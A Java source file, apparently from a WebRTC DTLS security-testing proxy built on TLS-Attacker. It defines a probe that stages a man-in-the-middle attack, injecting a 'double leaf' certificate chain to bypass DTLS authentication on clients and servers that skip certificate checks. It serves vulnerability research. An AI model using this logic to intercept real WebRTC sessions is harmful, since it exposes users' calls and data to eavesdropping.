/*
 * WebRTC-DTLS-Analysis-Proxy
 *
 * Copyright 2022-2025 Technology Innovation Institute (TII), Abu Dhabi
 *
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */
package de.rub.nds.dtlsproxy.probes.rtp.dtlsbypass;

import de.rub.nds.dtlsproxy.action.DynamicCertificateInjectionAction;
import de.rub.nds.dtlsproxy.config.ProxyConfiguration;
import de.rub.nds.dtlsproxy.enums.WebRtcProperties;
import de.rub.nds.dtlsproxy.report.WebRtcPlatformReport;
import de.rub.nds.dtlsproxy.util.CryptoUtil;
import de.rub.nds.dtlsproxy.util.TraceUtil;
import de.rub.nds.dtlsproxy.util.X509Util;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.protocol.message.*;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.action.*;
import de.rub.nds.x509attacker.filesystem.CertificateBytes;
import java.util.List;

public class BogusClientCertDoubleLeafServerCertBypass extends AuthBypass {

    private final boolean realFirst;

    public BogusClientCertDoubleLeafServerCertBypass(boolean realFirst) {
        super(
                "present double leaf client certificate, preset bogus client certificate",
                true,
                true);
        this.realFirst = realFirst;
    }

    /**
     * Creates a trace based on the assumption that the client accepts certificates not matching the
     * SDP fingerprinting if the actual server certificate is included, while the server accepts any
     * certificate
     *
     * <pre>
     *
     * Client                    MitM                  Server
     * -------------------------------------------------------
     * |---ClientHello--->|    Forward     |--->ClientHello->|
     * |<---ServerHello---|  ForwardTill   |<---ServerHello--|
     * |<----CERT**-------| DynamicInject  |<---CERT---------|
     * |<--------SKE------|  SendDynamic
     * |<---CertRequest---|     Send
     * |<-ServerHelloDone-|     Send
     * |----FINISHED----->| Receive Till
     *                      Receive Till |<------SHD--------|
     *                          Send     |---Certificate--->|
     *                      Dynamic Send |-------CKE------->|
     *                          Send     |----CV,CCS,FIN--->|
     * |<------CCS,FIN----|     Send
     *                      Receive Till |<-----FINISHED----|
     *
     *
     * </pre>
     */
    public WorkflowTrace createTrace(
            WebRtcPlatformReport report, ProxyConfiguration proxyConfiguration) {

        Config config = createConfig(proxyConfiguration, report);

        // set default cert chain to null for TLS-Attacker to use custom chain in CertificateMessage
        // instead
        config.setDefaultExplicitCertificateChain((List<CertificateBytes>) null);

        WorkflowTrace trace =
                TraceUtil.createMitmEntryTrace(
                        config,
                        ATTACKER_TO_SERVER_CONNECTION,
                        CLIENT_TO_ATTACKER_CONNECTION,
                        report);

        trace.addTlsAction(
                new ForwardMessagesAction(
                        CLIENT_TO_ATTACKER_CONNECTION,
                        ATTACKER_TO_SERVER_CONNECTION,
                        new ClientHelloMessage()));
        trace.addTlsAction(
                new TightForwardTillAction(
                        ATTACKER_TO_SERVER_CONNECTION,
                        CLIENT_TO_ATTACKER_CONNECTION,
                        new ServerHelloMessage()));
        trace.addTlsAction(
                new DynamicCertificateInjectionAction(
                        ATTACKER_TO_SERVER_CONNECTION,
                        CLIENT_TO_ATTACKER_CONNECTION,
                        realFirst,
                        true));

        trace.addTlsAction(new SendDynamicServerKeyExchangeAction(CLIENT_TO_ATTACKER_CONNECTION));
        trace.addTlsAction(
                new SendAction(
                        CLIENT_TO_ATTACKER_CONNECTION,
                        new CertificateRequestMessage(config),
                        new ServerHelloDoneMessage()));
        trace.addTlsAction(
                new ReceiveTillAction(CLIENT_TO_ATTACKER_CONNECTION, new FinishedMessage()));

        trace.addTlsAction(
                new ReceiveTillAction(ATTACKER_TO_SERVER_CONNECTION, new ServerHelloDoneMessage()));
        trace.addTlsAction(new SendAction(ATTACKER_TO_SERVER_CONNECTION, new CertificateMessage()));
        trace.addTlsAction(new SendDynamicClientKeyExchangeAction(ATTACKER_TO_SERVER_CONNECTION));
        trace.addTlsAction(
                new SendAction(
                        ATTACKER_TO_SERVER_CONNECTION,
                        new CertificateVerifyMessage(),
                        new ChangeCipherSpecMessage(),
                        new FinishedMessage()));

        TraceUtil.optionallyAddSessionTicketMessage(trace, report, CLIENT_TO_ATTACKER_CONNECTION);

        trace.addTlsAction(
                new SendAction(
                        CLIENT_TO_ATTACKER_CONNECTION,
                        new ChangeCipherSpecMessage(),
                        new FinishedMessage()));

        trace.addTlsAction(
                new ReceiveTillAction(ATTACKER_TO_SERVER_CONNECTION, new FinishedMessage()));
        return trace;
    }

    @Override
    public Config createConfig(ProxyConfiguration configuration, WebRtcPlatformReport report) {
        Config config = super.createConfig(configuration, report);
        X509Util.applySupportedSignatureAndHashAlgorithm(config, report, false);
        CryptoUtil.adjustClientCiphers(
                config, config.getDefaultX509CertificateConfig().getPublicKeyType());
        CryptoUtil.adjustServerCiphers(
                config, config.getDefaultX509CertificateConfig().getPublicKeyType());
        return config;
    }

    @Override
    public boolean isApplicable(WebRtcPlatformReport report) {

        if (!basicExecutionRequirementsMet(report)) {
            return false;
        }
        if (!isTrue(report, WebRtcProperties.SERVER_REQUESTS_CERTIFICATE)) {
            return false;
        }
        if (!isFalse(report, WebRtcProperties.SERVER_VERIFIES_CERTIFICATE)) {
            return false;
        }

        if (realFirst) {
            if (!isFalse(report, WebRtcProperties.CLIENT_REJECTS_DOUBLE_LEAF_TRICK_REAL_ATTACKER)) {
                return false;
            }
        } else {
            if (!isFalse(report, WebRtcProperties.CLIENT_REJECTS_DOUBLE_LEAF_TRICK_ATTACKER_REAL)) {
                return false;
            }
        }
        return true;
    }
}
